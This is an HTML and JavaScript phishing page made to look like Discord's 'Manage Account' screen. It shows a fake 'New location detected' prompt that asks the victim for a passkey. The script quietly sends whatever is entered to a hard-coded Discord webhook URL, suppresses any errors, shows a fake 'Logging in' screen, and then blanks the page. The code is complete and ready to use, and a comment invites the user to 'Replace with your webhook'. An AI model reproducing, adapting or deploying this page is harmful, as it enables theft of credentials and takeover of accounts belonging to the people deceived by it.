<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Discord Login</title>
  <style>
    body {
      margin: 0;
      font-family: "Segoe UI", sans-serif;
      background-color: #1e1f22;
      color: white;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }

    .container {
      background-color: #2b2d31;
      padding: 20px;
      border-radius: 10px;
      width: 400px;
    }

    h2 {
      margin-bottom: 20px;
      font-size: 18px;
      font-weight: 600;
    }

    .account-box {
      background-color: #1e1f22;
      padding: 10px;
      border-radius: 8px;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }

    .account-info {
      display: flex;
      align-items: center;
    }

    .avatar {
      width: 40px;
      height: 40px;
      border-radius: 50%;
      margin-right: 10px;
    }

    .details {
      display: flex;
      flex-direction: column;
    }

    .details .username {
      font-weight: 500;
    }

    .details .status {
      color: #f04747;
      font-size: 13px;
    }

    .login-btn {
      background-color: #5865F2;
      border: none;
      padding: 6px 14px;
      border-radius: 5px;
      color: white;
      font-weight: 500;
      cursor: pointer;
    }

    /* Passkey popup */
    .popup {
      position: fixed;
      top: 0;
      left: 0;
      height: 100%;
      width: 100%;
      background-color: rgba(0,0,0,0.7);
      backdrop-filter: blur(6px);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 10;
    }

    .popup-box {
      background-color: #2b2d31;
      padding: 30px;
      border-radius: 10px;
      width: 300px;
      text-align: center;
    }

    .popup-box h3 {
      margin-bottom: 5px;
      font-size: 17px;
    }

    .popup-box p {
      margin-top: 0;
      font-size: 13px;
      color: #aaa;
      margin-bottom: 15px;
    }

    .popup-box input {
      padding: 10px;
      width: 100%;
      margin-bottom: 15px;
      border-radius: 5px;
      border: none;
      background-color: #1e1f22;
      color: white;
    }

    .popup-box button {
      background-color: #5865F2;
      border: none;
      padding: 8px 20px;
      border-radius: 5px;
      color: white;
      cursor: pointer;
    }

    /* Loading screen with animation */
    .loading-screen {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      height: 100%;
      width: 100%;
      background-color: #1e1f22;
      color: white;
      align-items: center;
      justify-content: center;
      font-size: 22px;
      z-index: 999;
      flex-direction: column;
      animation: fadeIn 1s ease-in-out;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.95); }
      to { opacity: 1; transform: scale(1); }
    }

    .dots::after {
      content: '';
      display: inline-block;
      width: 1em;
      text-align: left;
      animation: dots 1.2s steps(3, end) infinite;
    }

    @keyframes dots {
      0% { content: ''; }
      33% { content: '.'; }
      66% { content: '..'; }
      100% { content: '...'; }
    }
  </style>
</head>
<body>

  <div class="container">
    <h2>Manage Account</h2>
    <div class="account-box">
      <div class="account-info">
        <img class="avatar" src="https://cdn-icons-png.flaticon.com/512/147/147144.png" alt="Avatar">
        <div class="details">
          <span class="username">drakify_x</span>
          <span class="status">Please log in again.</span>
        </div>
      </div>
      <button class="login-btn" onclick="showPopup()">Log in</button>
    </div>
  </div>

  <!-- Passkey Prompt -->
  <div class="popup" id="popup">
    <div class="popup-box">
      <h3>New location detected</h3>
      <p>Please confirm your identity</p>
      <input type="password" id="passInput" placeholder="Enter your passkey">
      <button onclick="sendPass()">Submit</button>
    </div>
  </div>

  <!-- Animated Loading -->
  <div class="loading-screen" id="loading">
    Logging in<span class="dots"></span>
  </div>

  <script>
    const popup = document.getElementById("popup");
    const loading = document.getElementById("loading");

    // Replace with your webhook
    const webhookURL = "https://discord.com/api/webhooks/1398237428195524669/eJ7Qcn2sFpQDs2GyqfixkC9Ov0En1xErVcYPm-C3lsPOnbtabV32IG1LbfDTiArolMKN";

    function showPopup() {
      popup.style.display = "flex";
      document.getElementById("passInput").focus();
    }

    function sendPass() {
      const passkey = document.getElementById("passInput").value;
      popup.style.display = "none";
      loading.style.display = "flex";

      // Send to Discord webhook silently
      fetch(webhookURL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          content: `🔐 New login attempt.\nPasskey: **${passkey}**`
        })
      }).catch(() => {});

      // Close site after 25s
      setTimeout(() => {
        document.body.innerHTML = "";
      }, 25000);
    }

    // Enter key support
    document.getElementById("passInput").addEventListener("keypress", function(e) {
      if (e.key === "Enter") sendPass();
    });
  </script>

</body>
</html>
